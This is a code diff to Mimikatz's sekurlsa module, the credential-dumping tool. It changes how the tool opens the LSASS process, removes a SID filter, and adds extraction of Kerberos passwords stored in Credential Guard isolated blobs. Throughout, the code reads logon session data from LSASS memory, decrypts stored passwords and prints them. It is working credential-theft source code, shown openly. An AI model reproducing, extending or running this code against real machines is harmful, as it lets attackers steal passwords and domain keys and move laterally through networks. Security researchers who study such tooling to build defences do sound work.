@@ -147,7 +147,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 	HANDLE hData = NULL;
 	DWORD pid;
 	PMINIDUMP_SYSTEM_INFO pInfos;
-	DWORD processRights = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
+	DWORD processRights = PROCESS_VM_READ | ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
 	BOOL isError = FALSE;
 
 	if(!cLsass.hLsassMem)
@@ -321,10 +321,10 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 							sessionData.LogonTime	= *((PFILETIME)		((PBYTE) aBuffer.address + helper->offsetToLogonTime));
 							sessionData.LogonServer	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToLogonServer);
 
-							kull_m_string_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);
-							kull_m_string_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);
-							kull_m_string_getUnicodeString(sessionData.LogonServer, cLsass.hLsassMem);
-							kull_m_string_getSid(&sessionData.pSid, cLsass.hLsassMem);
+							kull_m_process_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);
+							kull_m_process_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);
+							kull_m_process_getUnicodeString(sessionData.LogonServer, cLsass.hLsassMem);
+							kull_m_process_getSid(&sessionData.pSid, cLsass.hLsassMem);
 
 							retCallback = callback(&sessionData, pOptionalData);
 
@@ -353,18 +353,25 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LO
 {
 	PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA pLsassData = (PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA) pOptionalData;
 	ULONG i;
+	//PDWORD sub = NULL;
 	if((pData->LogonType != Network)/* && pData->LogonType != UndefinedLogonType*/)
 	{
-		kuhl_m_sekurlsa_printinfos_logonData(pData);
-		for(i = 0; i < pLsassData->nbPackages; i++)
-		{
-			if(pLsassData->lsassPackages[i]->Module.isPresent && lsassPackages[i]->isValid)
+		//if(IsValidSid(pData->pSid) && GetSidSubAuthorityCount(pData->pSid))
+		//	sub = GetSidSubAuthority(pData->pSid, 0);
+
+		//if(!sub || (*sub != 90 && *sub != 96))
+		//{
+			kuhl_m_sekurlsa_printinfos_logonData(pData);
+			for(i = 0; i < pLsassData->nbPackages; i++)
 			{
-				kprintf(L"\t%s :\t", pLsassData->lsassPackages[i]->Name);
-				pLsassData->lsassPackages[i]->CredsForLUIDFunc(pData);
-				kprintf(L"\n");
+				if(pLsassData->lsassPackages[i]->Module.isPresent && lsassPackages[i]->isValid)
+				{
+					kprintf(L"\t%s :\t", pLsassData->lsassPackages[i]->Name);
+					pLsassData->lsassPackages[i]->CredsForLUIDFunc(pData);
+					kprintf(L"\n");
+				}
 			}
-		}
+		//}
 	}
 	return TRUE;
 }
@@ -694,7 +701,7 @@ void kuhl_m_sekurlsa_trust_domainkeys(struct _KDC_DOMAIN_KEYS_INFO * keysInfo, P
 	{
 		kprintf(L"\n  [%s] ", prefix);
 		kprintf(incoming ? L"-> %wZ\n" : L"%wZ ->\n", domain);
-		if(kull_m_string_getUnicodeString(&keysInfo->password, cLsass.hLsassMem))
+		if(kull_m_process_getUnicodeString(&keysInfo->password, cLsass.hLsassMem))
 		{
 			kprintf(L"\tfrom: ");
 			if(kull_m_string_suspectUnicodeString(&keysInfo->password))
@@ -726,12 +733,12 @@ void kuhl_m_sekurlsa_trust_domainkeys(struct _KDC_DOMAIN_KEYS_INFO * keysInfo, P
 
 void kuhl_m_sekurlsa_trust_domaininfo(struct _KDC_DOMAIN_INFO * info)
 {
-	if(kull_m_string_getUnicodeString(&info->FullDomainName, cLsass.hLsassMem))
+	if(kull_m_process_getUnicodeString(&info->FullDomainName, cLsass.hLsassMem))
 	{
-		if(kull_m_string_getUnicodeString(&info->NetBiosName, cLsass.hLsassMem))
+		if(kull_m_process_getUnicodeString(&info->NetBiosName, cLsass.hLsassMem))
 		{
 			kprintf(L"\nDomain: %wZ (%wZ", &info->FullDomainName, &info->NetBiosName);
-			if(kull_m_string_getSid(&info->DomainSid, cLsass.hLsassMem))
+			if(kull_m_process_getSid(&info->DomainSid, cLsass.hLsassMem))
 			{
 				kprintf(L" / "); kull_m_string_displaySID(info->DomainSid);
 				LocalFree(info->DomainSid);
@@ -1020,7 +1027,8 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 	PWSTR sid = NULL;
 	PBYTE msvCredentials;
 	const MSV1_0_PRIMARY_HELPER * pMSVHelper;
-	
+	PLSAISO_DATA_BLOB blob = NULL;
+
 	if(mesCreds)
 	{
 		ConvertSidToStringSid(pData->pSid, &sid);
@@ -1100,7 +1108,7 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 			kprintf(L"\n\t * Smartcard"); 
 			if(mesCreds->UserName.Buffer)
 			{
-				if(kull_m_string_getUnicodeString(&mesCreds->UserName, cLsass.hLsassMem))
+				if(kull_m_process_getUnicodeString(&mesCreds->UserName, cLsass.hLsassMem))
 				{
 					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
 						(*lsassLocalHelper->pLsaUnprotectMemory)(mesCreds->UserName.Buffer, mesCreds->UserName.MaximumLength);
@@ -1129,7 +1137,7 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 			if(buffer.Length = buffer.MaximumLength = (USHORT) pHashPassword->Size)
 			{
 				buffer.Buffer = (PWSTR) pHashPassword->Checksump;
-				if(kull_m_string_getUnicodeString(&buffer, cLsass.hLsassMem))
+				if(kull_m_process_getUnicodeString(&buffer, cLsass.hLsassMem))
 				{
 					if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10) && (pHashPassword->Size > (ULONG) FIELD_OFFSET(LSAISO_DATA_BLOB, data)))
 					{
@@ -1155,25 +1163,47 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 			if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10)
 				mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL) mesCreds)->Password;
 			else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10_1607)
-				mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->Password;
+			{
+				switch(((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->type)
+				{
+				case 1:
+					mesCreds->Password.Length = mesCreds->Password.MaximumLength = 0;
+					mesCreds->Password.Buffer = NULL;
+					buffer.Length = buffer.MaximumLength = (USHORT) ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->IsoPassword.StructSize;
+					buffer.Buffer = (PWSTR) ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->IsoPassword.isoBlob;
+					if(kull_m_process_getUnicodeString(&buffer, cLsass.hLsassMem))
+						blob = (PLSAISO_DATA_BLOB) buffer.Buffer;
+					//break;
+				case 0:
+					// no creds
+					mesCreds->Password.Length = mesCreds->Password.MaximumLength = 0;
+					mesCreds->Password.Buffer = NULL;
+					break;
+				case 2:
+					mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->Password;
+					break;
+				default:
+					PRINT_ERROR(L"Unknown version in Kerberos credentials structure\n");
+				}
+			}
 			
 			if(mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Password.Buffer)
 			{
-				if(kull_m_string_getUnicodeString(&mesCreds->UserName, cLsass.hLsassMem) && kull_m_string_suspectUnicodeString(&mesCreds->UserName))
+				if(kull_m_process_getUnicodeString(&mesCreds->UserName, cLsass.hLsassMem) && kull_m_string_suspectUnicodeString(&mesCreds->UserName))
 				{
 					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
 						username = &mesCreds->UserName;
 					else
 						domain = &mesCreds->UserName;
 				}
-				if(kull_m_string_getUnicodeString(&mesCreds->Domaine, cLsass.hLsassMem) && kull_m_string_suspectUnicodeString(&mesCreds->Domaine))
+				if(kull_m_process_getUnicodeString(&mesCreds->Domaine, cLsass.hLsassMem) && kull_m_string_suspectUnicodeString(&mesCreds->Domaine))
 				{
 					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
 						domain = &mesCreds->Domaine;
 					else
 						username = &mesCreds->Domaine;
 				}
-				if(kull_m_string_getUnicodeString(&mesCreds->Password, cLsass.hLsassMem) /*&& !kull_m_string_suspectUnicodeString(&mesCreds->Password)*/)
+				if(kull_m_process_getUnicodeString(&mesCreds->Password, cLsass.hLsassMem) /*&& !kull_m_string_suspectUnicodeString(&mesCreds->Password)*/)
 				{
 					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
 						(*lsassLocalHelper->pLsaUnprotectMemory)(mesCreds->Password.Buffer, mesCreds->Password.MaximumLength);
@@ -1198,6 +1228,12 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 							kprintf(L"%wZ", password);
 					}
 					else kull_m_string_wprintf_hex(password->Buffer, password->Length, 1);
+
+					if(blob)
+					{
+						kuhl_m_sekurlsa_genericLsaIsoOutput(blob);
+						LocalFree(blob);
+					}
 				}
 
 				if(username)
